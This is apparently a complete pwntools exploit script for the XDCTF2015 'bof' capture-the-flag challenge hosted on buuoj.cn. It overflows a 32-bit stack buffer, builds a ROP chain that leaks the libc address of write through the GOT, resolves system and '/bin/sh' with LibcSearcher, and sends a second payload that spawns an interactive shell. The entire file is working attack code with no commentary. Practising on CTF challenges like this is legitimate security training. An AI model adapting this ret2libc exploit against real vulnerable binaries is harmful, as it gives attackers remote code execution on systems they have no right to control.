from pwn import *
from LibcSearcher import *
p = remote('node4.buuoj.cn', 27583)

context(os='linux', arch='i386')
# context.log_level = 'debug'

e = ELF('./bof')
main_addr = 0x804851c

payload1 = b'a'*(0x6c+4) + p32(e.plt['write']) + p32(main_addr) + p32(1) + p32(e.got['write']) + p32(4)

p.sendlineafter(b'Welcome to XDCTF2015~!\n', payload1)
write_addr = u32(p.recv(4))
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
system = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')

payload2 = b'a'*(0x6c + 4) + p32(system) + p32(0xdeadbeef) + p32(binsh)
p.sendlineafter(b'Welcome to XDCTF2015~!\n', payload2)
p.interactive()